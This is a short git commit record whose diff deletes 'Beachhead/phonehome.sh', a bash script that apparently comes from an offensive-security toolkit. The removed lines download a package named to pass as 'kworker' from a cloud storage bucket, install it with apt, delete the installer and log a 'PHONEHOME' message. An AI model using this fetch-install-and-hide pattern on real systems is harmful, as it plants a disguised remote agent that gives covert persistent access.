0bddd2b20555301dfe172cc4f0f46d23e5635f8f
github@merisec.com <xync@xync.org>
2023-02-09 21:08:03 -0700

    This one too

--- Beachhead/phonehome.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-wget -O /tmp/kworker.deb https://storage.googleapis.com/b8aa812nf/kworker_amd64.deb
-apt update
-apt install -y /tmp/kworker.deb
-rm -f /tmp/kworker.deb
-
-./logger.sh PHONEHOME 'Cloud Agent Installed'
